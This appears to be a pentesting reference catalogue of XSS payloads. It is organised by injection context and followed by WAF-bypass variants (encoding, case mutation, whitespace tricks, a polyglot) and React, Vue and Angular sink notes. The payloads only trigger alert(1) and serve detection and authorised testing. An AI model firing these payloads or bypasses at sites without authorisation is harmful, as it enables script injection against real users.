# XSS Payload Catalog

Use these payloads after the context is classified. Prefer the smallest payload that matches the reflection or sink.

## HTML Body

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

## Quoted Attribute

```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
" ><svg onload=alert(1)>
```

## Unquoted Attribute

```html
onfocus=alert(1) autofocus
x onmouseover=alert(1)
><svg onload=alert(1)>
```

## JavaScript String

```javascript
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
```

## Template Literals

```javascript
${alert(1)}
`);alert(1);//
${(()=>alert(1))()}
```

## URL / `href` / `src`

```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//example.com/%0ajavascript:alert(1)
```

Use these only when the application actually navigates, renders, or dereferences the value in a browser-controlled context.

## CSS / Style Context

```css
</style><script>alert(1)</script>
background-image:url("javascript:alert(1)")
```

Modern browsers block many legacy CSS execution paths. Treat CSS reflections as higher-friction and verify in-browser before calling them confirmed.

## DOM Verification Helpers

Use these to prove DOM execution after identifying a reachable source-to-sink chain:

```javascript
#location.hash
#"><img src=x onerror=alert(1)>
#${alert(1)}
```

Adjust the fragment, query string, storage value, or `postMessage` body to the source you mapped.

## WAF Bypass Catalog

Escalate gradually. Keep the payload semantically tied to the classified context.

### Encoding

```html
%3Csvg%20onload%3Dalert(1)%3E
\u003cscript\u003ealert(1)\u003c/script\u003e
&lt;img src=x onerror=alert(1)&gt;
```

### Case Mutation

```html
<ScRiPt>alert(1)</ScRiPt>
<SvG onLoAd=alert(1)>
```

### Separator and Whitespace Tricks

```html
<img/src=x/onerror=alert(1)>
<svg%0aonload=alert(1)>
<img src=x onerror%09=%09alert(1)>
```

### Event Swaps

```html
<details open ontoggle=alert(1)>
<video autoplay oncanplay=alert(1)><source>
<body onpageshow=alert(1)>
```

### Quote Minimization

```html
"><svg/onload=alert(1)>
'><img src=x onerror=alert(1)>
```

### Advanced Polyglots

Use only after you already know the context and need a harder bypass:

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */alert(1))//
```

## Framework-Specific Sinks And Bypasses

### React

Common sinks:
- `dangerouslySetInnerHTML`
- URL-bearing props such as `href` and `src`
- Third-party markdown or HTML renderers

Notes:
- Standard JSX interpolation escapes by default.
- Focus on places where untrusted HTML is intentionally injected.
- Check wrappers around sanitizers and any hand-rolled allowlists.

Useful probes:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

React-specific review points:
- `dangerouslySetInnerHTML={{ __html: userInput }}`
- `createElement` wrappers that pass attacker-controlled props
- hydration mismatches or server-rendered unsafe HTML

### Vue

Common sinks:
- `v-html`
- dynamic URL bindings such as `:href` and `:src`
- render functions compiling untrusted template content

Notes:
- Mustache interpolation escapes by default.
- `v-html` is the main high-signal sink.
- Watch for custom components that forward raw HTML to `innerHTML`.

Useful probes:

```html
<img src=x onerror=alert(1)>
javascript:alert(1)
```

Vue-specific review points:
- `v-html="userContent"`
- runtime template compilation from attacker-controlled strings
- router links or custom components that fail to constrain schemes

### Angular

Common sinks:
- `[innerHTML]`
- sanitizer bypass helpers such as `bypassSecurityTrustHtml`, `bypassSecurityTrustUrl`, and `bypassSecurityTrustScript`
- template injection into dynamically compiled components

Notes:
- Angular sanitizes many HTML and URL contexts by default.
- High-value findings usually involve explicit trust bypasses or dangerous custom wrappers.
- Treat interpolation alone as low-signal unless a custom rendering path reinterprets it.

Useful probes:

```html
<img src=x onerror=alert(1)>
javascript:alert(1)
```

Angular-specific review points:
- `this.sanitizer.bypassSecurityTrustHtml(userInput)`
- `[href]="userControlledValue"`
- libraries that disable or replace Angular sanitization
